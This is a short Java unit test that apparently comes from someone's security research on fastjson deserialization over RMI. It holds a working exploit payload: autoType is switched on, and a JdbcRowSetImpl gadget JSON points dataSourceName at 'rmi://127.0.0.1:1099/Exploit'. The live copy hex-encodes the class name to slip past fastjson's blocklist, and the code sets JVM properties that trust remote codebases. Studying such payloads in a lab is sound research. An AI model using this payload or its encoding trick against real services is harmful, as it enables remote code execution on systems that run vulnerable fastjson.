package com.pinger.javasec;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import org.junit.jupiter.api.Test;

/**
 * @author : p1n93r
 * @date : 2021/3/30 16:28
 * fastjson利用rmi进行攻击的一些测试
 * 主要是研究codebase的影响
 */
public class FastJsonSecTest {

    @Test
    public void test1(){
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
//        String exp="{\n" +
//                "  \"test\": {\n" +
//                "    \"@type\": \"Lcom.sun.rowset.JdbcRowSetImpl;\",\n" +
//                "    \"dataSourceName\": \"rmi://127.0.0.1:1099/Exploit\",\n" +
//                "    \"autoCommit\": true\n" +
//                "  }\n" +
//                "}";
        String exp="{\n" +
                "  \"test\": {\n" +
                "    \"@type\": \"L%63%6f%6d%2e%73%75%6e%2e%72%6f%77%73%65%74%2e%4a%64%62%63%52%6f%77%53%65%74%49%6d%70%6c;\",\n" +
                "    \"dataSourceName\": \"rmi://127.0.0.1:1099/Exploit\",\n" +
                "    \"autoCommit\": true\n" +
                "  }\n" +
                "}";
        JSON.parse(exp);
        // 第一个不是必要的
        System.setProperty("java.rmi.server.useCodebaseOnly", "false");
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
    }








}
